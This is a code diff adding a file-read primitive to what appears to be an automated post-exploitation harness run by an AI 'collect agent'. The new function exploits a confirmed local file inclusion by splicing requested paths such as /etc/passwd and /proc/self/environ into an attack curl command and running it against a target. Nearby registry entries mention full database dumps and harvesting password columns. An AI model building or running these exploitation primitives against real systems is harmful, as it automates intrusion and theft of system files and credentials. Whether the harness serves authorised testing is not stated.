@@ -13042,6 +13042,29 @@ def _postex_check_volume(row_count, est_row_bytes=None, override_max_rows=None):
             "reason": f"within policy ({rc} rows, ~{est_bytes} bytes) — full dump allowed"}
 
 
+def _postex_lfi_read_file(command, path, ip, port):
+    """LFI primitive: read a file through the confirmed LFI. The harness swaps the CURRENT
+    file path in the corrected LFI curl for the requested one, URL-encoding it. Detects the
+    replaceable path segment by looking for a common target (/etc/passwd, /proc/self/environ,
+    /var/log/...). Falls back to a naive query-string substitution if the shape is unusual."""
+    import re as _re, urllib.parse as _up
+    if not command or not path:
+        return None, None
+    # 1) explicit file:// or ?file=/?page= parameter
+    m = _re.search(r"(file=|page=|include=|template=|path=)([^&\s]+)", command, _re.I)
+    if m:
+        old_val = m.group(2)
+        new_val = _up.quote(path, safe="/:")
+        spliced = command.replace(m.group(0), m.group(1) + new_val, 1)
+        return _postex_run(spliced, ip, port), spliced
+    # 2) direct traversal of a known target
+    for known in ("/etc/passwd", "/etc/hosts", "/proc/self/environ", "/proc/version"):
+        if known in command:
+            spliced = command.replace(known, _up.quote(path, safe="/:"))
+            return _postex_run(spliced, ip, port), spliced
+    return None, None
+
+
 def _postex_primitive_registry():
     """Name -> callable + one-line description. This IS the set of composable skills the
     collect agent can invoke by name. Declared in postex_web.yaml `primitives:` for RAG."""
@@ -13060,6 +13083,12 @@ def _postex_primitive_registry():
             "~32 chars — the harness pages so you don't have to.",
             lambda args, ctx: (_postex_autopage(ctx["working_command"], args["expr"],
                                                 ctx["ip"], ctx["port"]), None),
+        ),
+        "lfi_read_file": (
+            "LFI primitive: read a target file through the confirmed LFI. Args: {path}. "
+            "The harness handles URL-encoding + path splicing.",
+            lambda args, ctx: _postex_lfi_read_file(ctx["working_command"], args.get("path", ""),
+                                                    ctx["ip"], ctx["port"]),
         ),
         "harvest_secret_columns": (
             "Filter a comma-separated column list down to just the SECRET/PASSWORD ones "
